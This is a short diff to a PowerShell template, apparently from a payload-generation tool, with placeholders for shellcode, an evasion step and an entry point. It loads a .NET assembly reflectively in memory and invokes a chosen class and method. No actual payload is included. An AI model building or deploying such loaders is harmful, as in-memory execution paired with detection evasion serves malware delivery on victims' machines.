@@ -1,10 +1,11 @@
 //####CODE####
 
+//####EVASION####
+
 $buf = ####SHELLCODE####
 
 //####CALL####
 
-//####EVASION####
-
-[System.Reflection.Assembly]::Load($buf)
-[proudcat.catloading]::Main()
+[byte[]] $byteOutArray = $buf
+$obj = [System.Reflection.Assembly]::Load($byteOutArray)
+[####CLASS_NAME####]::####FUNCTION_NAME####(####ENTRY_ARGS####)
